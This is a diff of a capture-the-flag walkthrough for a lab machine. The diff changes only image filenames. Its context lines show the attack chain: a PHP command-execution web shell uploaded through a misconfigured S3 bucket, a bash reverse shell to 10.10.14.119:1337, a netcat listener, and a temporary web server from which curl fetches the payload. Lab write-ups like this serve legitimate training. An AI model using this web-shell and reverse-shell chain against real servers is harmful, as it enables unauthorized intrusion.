@@ -73,7 +73,7 @@ After editing the host file to map the IP to the domain, we can use Gobuster to 
 
 <figure><img src="../../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>
 
 Answer: s3.thetoppers.htb
 
@@ -119,7 +119,7 @@ Answer: aws s3 ls
 
 Looking at the buckets with: `aws --endpoint=http://s3.thetoppers.htb s3 ls`
 
-<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
 we can go into this further: `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
 
@@ -141,7 +141,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 With the shell file created, we can use `cp` to get the file onto the server and run CMD.
 
-<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
 
 Confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php.
 
@@ -154,7 +154,7 @@ Now lets make a revershell script
 bash -i >& /dev/tcp/10.10.14.119/1337 0>&1
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (16) (3).png" alt=""><figcaption></figcaption></figure>
 
 Going to open a netcat shell with `nc -nvlp 1337`&#x20;
 
@@ -162,7 +162,7 @@ Going to open a netcat shell with `nc -nvlp 1337`&#x20;
 
 Now open a temp webserver to pull our script from: `python3 -m http.server 8081`&#x20;
 
-<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (11) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now we can use curl to get our script onto the server and executing it:
 
